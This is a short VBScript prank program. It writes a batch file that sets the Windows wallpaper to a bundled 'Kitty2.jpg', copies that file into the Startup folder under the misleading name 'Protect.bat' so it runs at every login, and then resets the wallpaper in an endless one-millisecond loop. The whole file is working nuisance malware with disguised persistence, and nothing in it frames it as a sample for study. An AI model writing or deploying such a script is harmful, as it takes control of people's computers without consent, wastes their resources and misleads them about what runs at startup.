Set WshShell = CreateObject("WScript.Shell")
wallpaperPath = WshShell.CurrentDirectory & "\Mems\Kitty2.jpg"
batFilePath = WshShell.CurrentDirectory & "\Mems.bat"

Sub SetWallpaper()
    Set objShell = CreateObject("WScript.Shell")
    objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", wallpaperPath
    objShell.RegWrite "HKCU\Control Panel\Desktop\WallpaperStyle", 2
    objShell.RegWrite "HKCU\Control Panel\Desktop\TileWallpaper", 0
    objShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True"
End Sub

Sub AddToStartup()
    Set fso = CreateObject("Scripting.FileSystemObject")
    startupFolderPath = WshShell.SpecialFolders("Startup")
    fso.CopyFile batFilePath, startupFolderPath & "\Protect.bat", True
End Sub

Set fso = CreateObject("Scripting.FileSystemObject")
Set batFile = fso.CreateTextFile(batFilePath, True)
batFile.WriteLine "@echo off"
batFile.WriteLine "reg add ""HKCU\Control Panel\Desktop"" /v Wallpaper /t REG_SZ /d """ & wallpaperPath & """ /f"
batFile.WriteLine "reg add ""HKCU\Control Panel\Desktop"" /v WallpaperStyle /t REG_SZ /d 2 /f"
batFile.WriteLine "reg add ""HKCU\Control Panel\Desktop"" /v TileWallpaper /t REG_SZ /d 0 /f"
batFile.WriteLine "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True"
batFile.Close

AddToStartup()
Do
    SetWallpaper()
    WScript.Sleep 1
Loop
